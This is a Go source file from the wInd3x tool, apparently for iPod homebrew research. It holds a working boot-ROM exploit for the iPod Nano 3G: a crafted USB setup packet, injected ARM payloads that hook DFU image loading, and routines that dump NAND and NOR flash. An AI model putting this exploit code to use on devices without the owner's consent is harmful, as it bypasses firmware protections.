package exploit

import (
	"fmt"

	"github.com/freemyipod/wInd3x/pkg/devices"
	"github.com/freemyipod/wInd3x/pkg/uasm"
)

// Flash Management Controller
const (
	// Base Address for the first controller
	FMC_BASE0 = 0x38a00000

	// Control Register 0
	FMC_CTRL0_OFF = 0x00
	// Control Register 1
	FMC_CTRL1_OFF = 0x04
	// Command Register
	FMC_CMD_OFF = 0x08
	// Address Register
	FMC_ADDR0_OFF = 0x0c
	FMC_ADDR1_OFF = 0x10
	FMC_ADDR2_OFF = 0x14
	// Address Counter Register
	FMC_ANUM_OFF = 0x2c
	// Data Counter Register
	FMC_DNUM_OFF = 0x30
	// Status Register
	FMC_STAT_OFF = 0x48
	// FIFO Start
	FMC_FIFO_OFF = 0x80
)

type epNano3G struct{}

func (_ *epNano3G) Prepare(_ devices.Usb) error {
	return nil
}

func (_ *epNano3G) DFUBufAddr() uint32 {
	return 0x22028220
}

func (_ *epNano3G) ExecAddr() uint32 {
	return 0x220284A8
}

func (_ *epNano3G) USBBufAddr() uint32 {
	return 0x22028A20
}

func (_ *epNano3G) TrampolineAddr() uint16 {
	// No trampoline necessary.
	return 0
}

func (_ *epNano3G) SetupPacket() []byte {
	// b 0x220284a8
	return []byte{0xa0, 0xfe, 0xff, 0xea, 0x06, 0x00, 0x00, 0x00}
}

func (_ *epNano3G) HandlerFooter(addr uint32) []uasm.Statement {
	return []uasm.Statement{
		// Return 0x40 bytes of requested address.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(addr)},
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0x40)},
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x2000aa40)},
		uasm.Blx{Dest: uasm.R2},

		// Fix up return.
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x200048d4)},
		uasm.Bx{Dest: uasm.LR},
	}
}

func (_ *epNano3G) AESCall() []uasm.Statement {
	return makeCall(0x20001f04, 0x22028220, 0x40, 1, 0, 0)
}

func (_ *epNano3G) HaxedDFUPayload() []uasm.Statement {
	return []uasm.Statement{
		// Copy descriptor to g_State->deviceDescriptor.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},

		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(379)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.R1},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.LabelRef("descriptor")},
		uasm.Ldrb{Dest: uasm.R2, Src: uasm.Deref(uasm.R1, 0)},

		uasm.Label("descriptor_copy_loop"),
		uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
		uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Sub{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("descriptor_copy_loop")},
		uasm.B{Dest: uasm.LabelRef("on_image_hook_skip")},

		uasm.Label("on_image_hook"),

		// Save LR.
		uasm.Sub{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(4)},
		uasm.Str{Src: uasm.LR, Dest: uasm.Deref(uasm.SP, 0)},

		// R0 = g_State->dfuBoot->img_addr2 (img1 header)
		uasm.Ldr{Dest: uasm.R4, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Deref(uasm.R4, 0)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R1, 1848)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 44)},
		// R1 = R0 + 0x800 (img1 body)
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x800)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.R0},
		// Call DFUBoot::CopyHeaderBody
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x20000ac4)},
		uasm.Blx{Dest: uasm.R2},

		// Set g_State->dfu_done = 1.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(1)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 44)},

		// Set g_State->img1_version = "1.0"
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x302e31)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 52)},
		// Set g_State->entrypoint = 0
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 48)},

		// Restore LR.
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Deref(uasm.SP, 0)},
		uasm.Add{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(4)},

		// Return 0.
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(0)},
		uasm.Bx{Dest: uasm.LR},

		uasm.Label("on_image_hook_skip"),

		// Copy on_image_hook to some free memory.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203d800)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.LabelRef("on_image_hook")},
		//uasm.Ldr{Dest: uasm.R2, Src: uasm.LabelRef("on_image_hook_skip")},
		// ... also need constant pool.
		//
		// TODO(q3k): add constant pool markers to uasm and unhardcode this
		// mess.
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x100)},
		uasm.Label("hook_copy_loop"),
		uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
		uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Sub{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("hook_copy_loop")},

		// Set g_State->dfuOnImage = 0x2203d800 (hook)
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x2203d800)},
		//uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x200034f0)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 40)},
	}
}

func (_ *epNano3G) DisableICache() []uasm.Statement {
	return makeCall(0x20000418)
}

func (_ *epNano3G) NANDInit(bank uint32) ([]uasm.Statement, error) {
	// The N3G seems to have at least two NAND controller peripherals? We use
	// the first one (arg 0 to calls).

	var res []uasm.Statement
	// Enable clocks 8, 12.
	res = append(res, makeCall(0x2000147c, 8)...)
	res = append(res, makeCall(0x2000147c, 12)...)
	// Configure GPIO
	res = append(res, makeCall(0x20001830, 0)...)
	// Reset nand bank.
	res = append(res, makeCall(0x200096e4, 0, bank)...)
	return res, nil
}

func (_ *epNano3G) NANDReadPage(bank, page, offset uint32) ([]uasm.Statement, uint32) {
	// Call with bogus last argument (needs 12 bytes of data output as extra argument... ECC..?)
	return makeCall(0x20009910, 0, bank, page, 0x22000100, 0x22000000), 0x22000100 + offset
}

func (_ *epNano3G) NANDIdentify() ([]uasm.Statement, uint32) {
	return []uasm.Statement{
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(FMC_BASE0)},  // Address base of first FMC controller
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x22000100)}, // Destination buffer

		// Write Read Command 0x90 to FMCMD
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x90)}, // Read ID Command
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_CMD_OFF)},

		uasm.Label("wait_rbb_done_loop"),
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Deref(uasm.R0, FMC_STAT_OFF)},
		uasm.And{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(0x2)}, // RBB_DONE
		uasm.Cmp{A: uasm.R1, B: uasm.Immediate(0x2)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("wait_rbb_done_loop")},

		// Set rbb done
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x2)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_STAT_OFF)},

		// Read from address 0x00 to get the identifier
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x00)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_ANUM_OFF)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_ADDR0_OFF)},

		// Transfer the address
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x1)}, // Set DO_TRANS_ADDR bit
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_CTRL1_OFF)},

		uasm.Label("wait_cmd_done_loop"),
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Deref(uasm.R0, FMC_STAT_OFF)},
		uasm.And{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(0x4)}, // CMD_DONE
		uasm.Cmp{A: uasm.R1, B: uasm.Immediate(0x4)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("wait_cmd_done_loop")},

		// Set cmd done
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x4)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_STAT_OFF)},

		// We want to read seven bytes of data
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(7)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_DNUM_OFF)},

		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(1)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_ADDR2_OFF)}, // IDK was in CS code

		// Read the data
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x000001C2)}, // DO_READ_DATA, Flush FIFOs
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_CTRL1_OFF)},

		// Wait for transfer to complete
		uasm.Label("wait_addr_done_loop"),
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Deref(uasm.R0, FMC_STAT_OFF)},
		uasm.And{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(0x8)}, // ADDR_DONE
		uasm.Cmp{A: uasm.R1, B: uasm.Immediate(0x8)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("wait_addr_done_loop")},

		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x00000100)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_ADDR2_OFF)}, // IDK was in CS code

		// Flush WFIFO and Parity
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x00000340)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, FMC_CTRL1_OFF)},

		// Copy to destination buffer
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Deref(uasm.R0, FMC_FIFO_OFF)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R2, 0)},
	}, 0x22000100
}

func (_ *epNano3G) NORInit(spino uint32) ([]uasm.Statement, error) {
	var clk uint32
	switch spino {
	case 0:
		clk = 0x22
	case 1:
		clk = 0x2b
	case 2:
		clk = 0x2f
	default:
		return nil, fmt.Errorf("unknown spi peripheral number")
	}
	return []uasm.Statement{
		// Configure GPIO for given peripheral.
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(spino)},
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20001924)},
		uasm.Blx{Dest: uasm.LR},

		// Enable clock for given peripheral.
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(clk)},
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x2000147c)},
		uasm.Blx{Dest: uasm.LR},
	}, nil
}
func (_ *epNano3G) NORRead(spino, offset uint32) ([]uasm.Statement, uint32) {
	return []uasm.Statement{
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(spino)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x84)}, // ???? SPCNT?
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20008f90)},
		uasm.Blx{Dest: uasm.LR},

		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(spino)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x80)},
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x22020000)},
		uasm.Ldr{Dest: uasm.R3, Src: uasm.Constant(offset)},
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x2000906c)},
		uasm.Blx{Dest: uasm.LR},
	}, 0x22020000
}
